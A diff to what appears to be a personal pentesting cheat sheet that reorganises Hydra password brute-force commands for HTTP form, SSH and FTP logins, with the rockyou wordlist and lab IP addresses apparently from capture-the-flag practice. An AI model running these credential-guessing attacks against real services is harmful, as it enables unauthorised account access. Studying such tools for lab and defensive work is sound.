@@ -5,10 +5,21 @@
 
 # Hydra
 
-`hydra -l username -P wordlist.txt server service `
-ex: `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.212.173 ftp`
-ex: `hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.10.6`
+
+## http
+sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
+hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+## ssh
+`hydra -l <username> -P <full path to pass> 10.10.48.36 -t 4 ssh`
+`hydra -l username -P wordlist.txt server service`
 `hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.216.161 ssh`
+
+
+## ftp
+`hydra -l user -P passlist.txt ftp://$IP`
+`hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.212.173 ftp`
+`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV ftp://10.10.10.6`
 
 
 There are some extra optional arguments that you can add:
